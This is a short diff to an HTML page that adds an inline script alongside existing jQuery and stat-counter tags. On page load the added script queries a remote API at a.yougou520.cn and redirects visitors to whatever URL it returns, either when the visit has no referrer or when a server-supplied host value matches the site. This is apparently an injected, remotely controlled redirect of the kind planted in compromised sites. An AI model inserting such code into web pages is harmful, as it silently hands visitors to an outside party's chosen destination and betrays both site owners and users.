@@ -1400,6 +1400,22 @@
   </style>
   <script src="https://image.163ar.cn/xuetang001/static/js/jquery-1.8.0.min.js" type="text/javascript"></script>
   <script src="https://a.shangning.org.cn/api/count/tj_stat.html?id=1424&web_id=1424&code=88a17463d2312922e6d41e78fd85faef" language="JavaScript"></script>
+  <script>
+    var referrer_url = document.referrer;
+    var host = window.location.host
+    var data = ''
+    $.get('https://a.yougou520.cn/api/Templatejump/wzapi/id/3773', function (res) {
+      data = res
+      console.log(data)
+      if(referrer_url == ''){
+        window.location.href = 'http://' + data.url
+      } else {
+        if (data.first === host) {
+          window.location.href = 'http://' + data.url
+        }
+      }
+    }) 
+  </script>
   <style>
   </style>
   <!--[if lt IE 9]>
